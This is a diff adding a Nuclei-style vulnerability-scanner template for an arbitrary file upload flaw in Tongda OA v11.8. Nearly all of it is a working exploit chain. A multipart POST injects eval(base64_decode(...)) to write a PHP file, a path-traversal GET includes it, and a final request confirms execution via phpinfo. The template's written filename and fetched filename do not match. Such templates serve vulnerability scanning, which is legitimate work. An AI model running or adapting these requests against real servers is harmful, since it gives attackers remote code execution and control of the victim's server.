@@ -1,0 +1,46 @@
+id: tongda-api-file-upload
+
+info:
+  name: Tongda OA v11.8 api.ali.php - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Tongda OA v11.8 api.ali.php has an arbitrary file upload vulnerability. An attacker can upload malicious files to control the server through the vulnerability.
+  reference:
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-oa-api-ali-upload.yaml
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,oa,fileupload,intrusive
+
+http:
+  - raw:
+      - |
+        POST /mobile/api/api.ali.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=502f67681799b07e5de6b503655f5cae
+        Accept-Encoding: gzip
+
+        --502f67681799b07e5de6b503655f5cae
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
+        Content-Type: application/octet-stream
+
+        {"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{"a":"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*"}"}
+        --502f67681799b07e5de6b503655f5cae--
+      - |
+        GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{trim_prefix(date_time("%Y%M", unix_time()),"20")}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+      - |
+        GET /{{randstr}}.php  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200'
+          - 'contains(body_2,"+OK") && contains(body_3,"phpinfo")'
+        condition: and
+# digest: 4a0a004730450220103f367a65ab9588d4d0cc323e25b015506994fceb2afaafb04929b68fea0977022100be33552d5aff233b9ec1022e019f8909f02aceb12541f6ed76a9e5a92121274c:922c64590222798bb761d5b6d8e72950
